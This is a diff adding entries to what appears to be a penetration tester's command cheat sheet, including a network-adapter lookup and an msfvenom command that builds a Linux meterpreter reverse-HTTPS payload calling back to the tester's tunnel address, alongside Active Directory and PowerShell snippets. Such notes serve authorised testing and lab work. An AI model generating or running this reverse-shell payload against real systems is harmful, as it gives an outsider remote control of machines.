@@ -2,6 +2,7 @@
 $ ip: ip a s tun0 | grep 'inet ' | awk '{print $2}' | sed 's/\/.*//g'
 $ port: echo '80'
 $ file: echo 'exec-revshell.exe'
+$ adapter: ip a | grep -P '^\d*:' | grep -v 'veth\|br-\|lo\|docker' | cut -d ':' -f 2 | cut -d '@' -f 1
 $ target: echo 'target.com'
 
 # enumeration
@@ -340,6 +341,10 @@ $SecPassword = ConvertTo-SecureString 'PASSWDREPLACE' -AsPlainText -Force ; $Cre
 # Load a .DLL into memory
 Import-Module .\Microsoft.ActiveDirectory.Management.dll
 
+# Revshell with oennieshead revshell handler
+msfvenom -p linux/x64/meterpreter_reverse_https lhost=$(ip a s <adapter> | grep 'inet ' | awk '{print $2}' | sed 's/\/.*//g') lport=<port> LURI=$endpoint HttpProxyIE=False -f elf
+
 # General notes
 ` escapes "
 Invoke-RestMethod (irm) can replace iwr
+
